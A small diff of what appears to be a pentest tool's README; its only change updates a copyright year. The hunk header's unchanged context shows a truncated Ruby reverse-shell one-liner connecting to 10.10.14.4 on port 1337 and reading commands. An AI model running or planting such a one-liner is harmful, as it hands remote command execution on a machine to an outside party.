@@ -174,7 +174,7 @@ require "socket";exit if fork;c=TCPSocket.new("10.10.14.4","1337");while(cmd=c.g
 ```
 
 ## Author
-Copyright (C) 2020-2021 Peter Bruce Funnell
+Copyright (C) 2020-2022 Peter Bruce Funnell
 
 ## License
 This program is free software: you can redistribute it and/or modify it under the terms of the GNU General Public License as published by the Free Software Foundation, either version 3 of the License, or (at your option) any later version.
